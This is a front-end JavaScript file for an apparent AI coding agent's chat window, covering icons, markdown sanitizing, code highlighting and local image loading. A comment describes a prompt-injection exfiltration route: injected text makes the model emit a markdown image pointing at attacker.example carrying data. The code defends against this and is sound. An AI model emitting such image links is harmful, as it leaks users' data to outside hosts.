'use strict';
/* global cf, marked, DOMPurify, hljs */
// Part of the window's script, split by feature. The files are plain scripts,
// loaded in order by index.html and sharing one global scope: what one
// declares, the later ones use. Icons, small helpers, markdown and the images an answer names in the session folder.

// ── Icons (constant markup only) ───────────────────────────────────────────
const ICON = {
  plus: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg>',
  folder: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>',
  arrowUp: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>',
  stop: '<svg viewBox="0 0 24 24" fill="currentColor"><rect x="6.5" y="6.5" width="11" height="11" rx="2"/></svg>',
  check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg>',
  x: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg>',
  dot: '<svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="4.5"/></svg>',
  minus: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"><path d="M7 12h10"/></svg>',
  chevron: '<svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>',
  model: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M12 3l8 4.5v9L12 21l-8-4.5v-9z"/><path d="M12 12l8-4.5M12 12v9M12 12L4 7.5"/></svg>',
  shield: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M12 3l7 3v6c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6z"/></svg>',
  bolt: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M13 3L5 13h6l-1 8 8-10h-6z"/></svg>',
  caret: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 10l5 5 5-5"/></svg>',
  gear: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/></svg>',
  file: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/><path d="M14 3v5h5"/></svg>',
  gauge: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4.5 16.5a8 8 0 1 1 15 0"/><path d="M12 15l4-5"/></svg>',
  paperclip: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5l-8.6 8.6a5.5 5.5 0 0 1-7.8-7.8l8.6-8.6a3.7 3.7 0 0 1 5.2 5.2l-8.6 8.6a1.8 1.8 0 0 1-2.6-2.6l7.9-7.9"/></svg>',
  monitor: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/></svg>',
  crop: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2v14a2 2 0 0 0 2 2h14"/><path d="M2 6h14a2 2 0 0 1 2 2v14"/></svg>',
  image: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2.5"/><circle cx="9" cy="10" r="1.8"/><path d="M21 16l-5-5-9 9"/></svg>',
  upload: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 16V4M6 10l6-6 6 6M4 20h16"/></svg>',
  robot: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="8" width="16" height="11" rx="3"/><path d="M12 4v4M9 13h.01M15 13h.01M9.5 16.5h5"/></svg>',
  panel: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2.5"/><path d="M15 4v16"/></svg>',
  eye: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/></svg>',
  mic: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M5.5 11a6.5 6.5 0 0 0 13 0M12 17.5V21"/></svg>',
  compress: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M4 14h6v6M20 10h-6V4M14 10l7-7M3 21l7-7"/></svg>',
  wider: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6l-6 6 6 6M12 6l-6 6 6 6"/></svg>',
  narrower: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6l6 6-6 6M12 6l6 6-6 6"/></svg>',
  card: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5.5" width="18" height="13" rx="2.5"/><path d="M3 10h18M7 15h3"/></svg>',
  key: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="15" r="4"/><path d="M10.8 12.2 20 3M17 6l3 3M14.5 8.5l2.5 2.5"/></svg>',
  more: '<svg viewBox="0 0 24 24" fill="currentColor"><circle cx="5" cy="12" r="1.8"/><circle cx="12" cy="12" r="1.8"/><circle cx="19" cy="12" r="1.8"/></svg>',
  edit: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 20h4L19 9l-4-4L4 16v4z"/><path d="M14 6l4 4"/></svg>',
  copy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><rect x="8" y="8" width="12" height="12" rx="2"/><path d="M16 8V6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2"/></svg>',
  pin: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 4h6l-1 5 3 3v2H7v-2l3-3-1-5z"/><path d="M12 14v6"/></svg>',
  trash: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/></svg>',
  user: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="12" cy="8" r="4"/><path d="M4 20c1.5-4 4.5-6 8-6s6.5 2 8 6"/></svg>',
  lock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><rect x="5" y="10" width="14" height="10" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>',
  sliders: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M4 6h10M18 6h2M4 12h4M12 12h8M4 18h12M20 18h0"/><circle cx="16" cy="6" r="2"/><circle cx="10" cy="12" r="2"/><circle cx="18" cy="18" r="2"/></svg>',
  plug: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 3v5M15 3v5M6 8h12v3a6 6 0 0 1-12 0V8zM12 17v4"/></svg>',
  sparkle: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M12 3l1.8 5.2L19 10l-5.2 1.8L12 17l-1.8-5.2L5 10l5.2-1.8z"/></svg>',
  branch: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="6.5" cy="5.5" r="2.4"/><circle cx="6.5" cy="18.5" r="2.4"/><circle cx="17.5" cy="9" r="2.4"/><path d="M6.5 7.9v8.2"/><path d="M17.5 11.4a5 5 0 0 1-5 4.6H9.4"/></svg>',
  refresh: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M20 11a8 8 0 1 0-2.6 6"/><path d="M20 4.5V11h-6"/></svg>',
};
const LOGO = '<svg viewBox="0 0 32 32"><defs><linearGradient id="cfg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#8b9bff"/><stop offset="1" stop-color="#b48cff"/></linearGradient></defs><rect width="32" height="32" rx="9" fill="url(#cfg)"/><path d="M9.5 11l5 5-5 5M16.5 21h6.5" fill="none" stroke="#0b0d12" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';

// ── Helpers ────────────────────────────────────────────────────────────────
const $ = (id) => document.getElementById(id);

function el(tag, className, text) {
  const node = document.createElement(tag);
  if (className) node.className = className;
  if (text != null) node.textContent = text;
  return node;
}

function icon(name, className = 'icon') {
  const node = el('span', className);
  node.innerHTML = ICON[name];
  return node;
}

function chevron() {
  const holder = el('span');
  holder.innerHTML = ICON.chevron;
  return holder.firstChild;
}

async function call(fn, arg) {
  const res = await fn(arg);
  if (!res || !res.ok) {
    const err = new Error((res && res.error && res.error.message) || 'Something went wrong.');
    Object.assign(err, (res && res.error) || {});
    throw err;
  }
  return res.data;
}

// Formatting lives in lib/format.js, where it is tested.
const {
  fmtNum, baseName, firstLine, lineCount, fmtCompact, fmtTokens, fmtDuration,
  relTime, startOfDay, groupOf, fmtStamp, clipText,
} = CF_FORMAT;
const nowIso = () => new Date().toISOString();

// ── Remote images in an answer ─────────────────────────────────────────────
// An answer is written by a model, and a model can be steered by what it reads:
// a web page or a file can tell it to write ![](https://attacker.example/?d=…),
// and an image that loads by itself would send that data away with nobody
// clicking anything. So an image loads on its own only from CodingFleet (the
// images the agent generates live on files.codingfleet.com) or from the API
// the app talks to; any other one waits behind a button that names its host.
// Removed while sanitizing, before the HTML exists anywhere a browser would
// fetch it: an <img> fetches as soon as its src is set, even detached.
function trustedImageHost(host) {
  const h = String(host || '').toLowerCase();
  if (h === 'codingfleet.com' || h.endsWith('.codingfleet.com')) return true;
  try {
    return Boolean(S.settings && S.settings.apiBase) && h === new URL(S.settings.apiBase).host.toLowerCase();
  } catch {
    return false;
  }
}

function remoteImageHost(src) {
  try {
    const url = new URL(String(src || ''));
    return /^https?:$/.test(url.protocol) ? url.host : null;
  } catch {
    return null; // a relative path: a file in the session folder, handled later
  }
}

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // srcset can name any host and is never needed in an answer.
  if (node.hasAttribute('srcset')) node.removeAttribute('srcset');
  if (node.nodeName !== 'IMG' && !(node.nodeName === 'INPUT' && node.getAttribute('type') === 'image')) return;
  const host = remoteImageHost(node.getAttribute('src'));
  if (host && !trustedImageHost(host)) {
    node.setAttribute('data-remote-src', node.getAttribute('src'));
    node.removeAttribute('src');
  }
});

const md = (text) => DOMPurify.sanitize(marked.parse(text || '', { gfm: true, breaks: false }));

// An image held back for its host: a button that says where it comes from,
// and loads it only when pressed.
function gateRemoteImage(img) {
  const src = img.getAttribute('data-remote-src');
  const host = remoteImageHost(src) || 'another site';
  const gate = el('button', 'remote-image-gate');
  gate.type = 'button';
  gate.title = `${src}\nLoading it tells ${host} that you opened this answer, and anything in the address.`;
  gate.append(icon('image'), el('span', null, `Show image from ${host}`));
  gate.addEventListener('click', () => {
    img.removeAttribute('data-remote-src');
    img.src = src;
    gate.replaceWith(img);
  });
  img.replaceWith(gate);
}

// Natural sizes of images already loaded, so a streamed answer that is drawn
// again keeps each image's box instead of collapsing and jumping.
const imageSizes = new Map();

// Code blocks: colors for the language, its name, and a copy button.
const HIGHLIGHT_LIMIT = 200_000;   // longer code is shown plain
const GUESS_LIMIT = 20_000;        // a block without a language is guessed up to this size
const LANGUAGE_NAMES = {
  js: 'JavaScript', javascript: 'JavaScript', jsx: 'JSX', ts: 'TypeScript', typescript: 'TypeScript',
  tsx: 'TSX', py: 'Python', python: 'Python', sh: 'Shell', bash: 'Bash', shell: 'Shell', zsh: 'Shell',
  ps1: 'PowerShell', powershell: 'PowerShell', cs: 'C#', csharp: 'C#', cpp: 'C++', 'c++': 'C++', c: 'C',
  go: 'Go', rs: 'Rust', rust: 'Rust', rb: 'Ruby', ruby: 'Ruby', php: 'PHP', java: 'Java', kt: 'Kotlin',
  kotlin: 'Kotlin', swift: 'Swift', sql: 'SQL', html: 'HTML', xml: 'XML', css: 'CSS', scss: 'SCSS',
  json: 'JSON', yaml: 'YAML', yml: 'YAML', toml: 'TOML', ini: 'INI', md: 'Markdown', markdown: 'Markdown',
  dockerfile: 'Dockerfile', docker: 'Dockerfile', diff: 'Diff', makefile: 'Makefile', lua: 'Lua',
  dart: 'Dart', scala: 'Scala', r: 'R', vue: 'Vue', svelte: 'Svelte', graphql: 'GraphQL', nginx: 'Nginx',
};
// Languages highlight.js knows under another name.
const LANGUAGE_ALIASES = { vue: 'xml', svelte: 'xml', astro: 'xml', env: 'bash', dotenv: 'bash',
  jsonc: 'json', json5: 'json', hcl: 'ini', terraform: 'ini', tf: 'ini', zsh: 'bash', console: 'bash' };

function codeLanguage(code) {
  const match = /(?:^|\s)language-([\w#+.-]+)/.exec(code.className || '');
  return match ? match[1].toLowerCase() : '';
}

function highlightCode(code, lang) {
  if (typeof hljs === 'undefined') return '';
  const text = code.textContent;
  if (!text || text.length > HIGHLIGHT_LIMIT) return '';
  const name = LANGUAGE_ALIASES[lang] || lang;
  try {
    if (name && hljs.getLanguage(name)) {
      code.innerHTML = hljs.highlight(text, { language: name, ignoreIllegals: true }).value;
      return name;
    }
    if (!lang && text.length <= GUESS_LIMIT) {
      const guess = hljs.highlightAuto(text);
      if (guess.language && guess.relevance >= 5) {
        code.innerHTML = guess.value;
        return guess.language;
      }
    }
  } catch { /* shown plain */ }
  return '';
}

function languageLabel(lang, detected) {
  const key = lang || detected;
  if (!key) return 'Code';
  if (LANGUAGE_NAMES[key]) return LANGUAGE_NAMES[key];
  const known = typeof hljs !== 'undefined' && hljs.getLanguage(key);
  return (known && known.name) || key;
}

function decorateCode(node) {
  for (const pre of node.querySelectorAll('pre')) {
    const code = pre.querySelector('code');
    if (!code || pre.parentElement.classList.contains('code-block')) continue;
    const lang = codeLanguage(code);
    const detected = highlightCode(code, lang);
    code.classList.add('hljs');
    const block = el('div', 'code-block');
    const head = el('div', 'code-head');
    const copy = el('button', 'code-copy');
    copy.type = 'button';
    copy.title = 'Copy code';
    copy.innerHTML = ICON.copy;
    copy.append(el('span', null, 'Copy'));
    copy.addEventListener('click', async () => {
      const res = await cf.copyText(code.textContent);
      const label = copy.querySelector('span');
      copy.classList.toggle('done', Boolean(res && res.ok));
      label.textContent = res && res.ok ? 'Copied' : 'Could not copy';
      clearTimeout(copy.timer);
      copy.timer = setTimeout(() => {
        copy.classList.remove('done');
        label.textContent = 'Copy';
      }, 1600);
    });
    head.append(el('span', 'code-lang', languageLabel(lang, detected)), copy);
    pre.replaceWith(block);
    block.append(head, pre);
  }
}

function setMarkdown(node, text) {
  node.innerHTML = md(text);
  decorateCode(node);
  // A generated image is saved with the answer, and the model often shows it
  // again in its reply: each picture is shown once.
  const seen = new Set();
  for (const img of node.querySelectorAll('img')) {
    // A held-back remote image has no src yet: its address is kept aside.
    const key = img.getAttribute('data-remote-src') || img.src;
    if (!seen.has(key)) {
      seen.add(key);
      continue;
    }
    const holder = img.closest('a') || img;
    const block = holder.parentElement;
    holder.remove();
    if (block && block !== node && !block.textContent.trim() && !block.querySelector('img')) block.remove();
  }
  // A path instead of a URL is a file in the session's folder: nothing serves
  // it, so the picture is read through the main process.
  for (const img of node.querySelectorAll('img[data-remote-src]')) gateRemoteImage(img);
  for (const img of node.querySelectorAll('img')) adoptLocalImage(img);
  for (const img of node.querySelectorAll('img')) {
    img.decoding = 'async';
    if (img.dataset.local && !img.getAttribute('src')) continue;
    const known = imageSizes.get(img.src);
    if (known) {
      img.width = known.width;
      img.height = known.height;
      img.classList.add('ready');
      continue;
    }
    img.addEventListener('load', () => {
      imageSizes.set(img.src, { width: img.naturalWidth, height: img.naturalHeight });
      img.classList.add('ready');
    }, { once: true });
    img.addEventListener('error', () => img.classList.add('ready', 'broken'), { once: true });
  }
}

// ── Images in the session's folder ─────────────────────────────────────────
// The agent writes ![a chart](out/plot.png) for an image it made on this
// computer. Nothing serves that path and the window has no filesystem, so the
// main process reads the file and sends the picture back. Each one is fetched
// once and kept: streamed text redraws its markdown every frame.
const localImages = new Map();        // `${sessionId}\n${path}` -> entry
const LOCAL_IMAGE_RECHECK_MS = 4000;  // a file written again is picked up this soon

function localImageEntry(sessionId, src) {
  const key = `${sessionId}\n${src}`;
  let entry = localImages.get(key);
  if (!entry) {
    entry = { key, sessionId, src, url: null, error: null, at: 0, pending: null };
    localImages.set(key, entry);
  }
  if (!entry.pending && Date.now() - entry.at > LOCAL_IMAGE_RECHECK_MS) {
    entry.pending = call(cf.localImage, { sessionId, path: src }).then((data) => {
      entry.url = data.url;
      entry.error = null;
    }, (err) => {
      entry.url = null;
      entry.error = err.message || 'This image could not be read.';
    }).then(() => {
      entry.pending = null;
      entry.at = Date.now();
      for (const img of document.querySelectorAll('img[data-local]')) {
        if (img.dataset.local === key) paintLocalImage(img, entry);
      }
    });
  }
  return entry;
}

function paintLocalImage(img, entry) {
  if (entry.url) {
    img.classList.remove('broken');
    if (img.getAttribute('src') !== entry.url) {
      img.addEventListener('load', () => img.classList.add('ready'), { once: true });
      img.src = entry.url;
    }
  } else if (entry.error) {
    // In a tool step the picture is an extra, not the message: drop it rather
    // than leave a broken box where the agent already reported what it saw.
    if (img.classList.contains('tool-image')) {
      img.remove();
      return;
    }
    img.removeAttribute('src');
    img.classList.add('ready', 'broken');
    img.alt = `${entry.src} — ${entry.error}`;
    img.title = img.alt;
  }
}

// Makes one <img> a picture of a local file, or leaves it alone when its src
// is a URL. Returns whether it took it over.
function adoptLocalImage(img, sessionId = S.current) {
  const raw = img.getAttribute('src') || '';
  const src = window.CF_IMAGES ? CF_IMAGES.localImageSource(raw) : null;
  const folder = Boolean(sessionId && local(sessionId).cwd);
  if (!src) {
    // Half a path, because the answer is still being written. Keep it out of
    // sight instead of letting the window load it and draw a broken box.
    if (folder && raw && !/^[a-z][a-z0-9+.-]+:/i.test(raw)) {
      img.removeAttribute('src');
      img.hidden = true;
      return true;
    }
    return false;
  }
  if (!folder) return false;
  img.hidden = false;
  img.removeAttribute('src');
  img.dataset.local = `${sessionId}\n${src}`;
  img.dataset.localPath = src;
  img.alt = img.alt || src;
  img.title = src;
  paintLocalImage(img, localImageEntry(sessionId, src));
  return true;
}

// The same picture, larger, for the viewer.
function fullLocalImage(img) {
  const [sessionId, src] = String(img.dataset.local || '').split('\n');
  return call(cf.localImage, { sessionId, path: src, full: true }).then((data) => data.url);
}

function originOf(base) {
  try { return new URL(base).origin; } catch { return 'https://codingfleet.com'; }
}
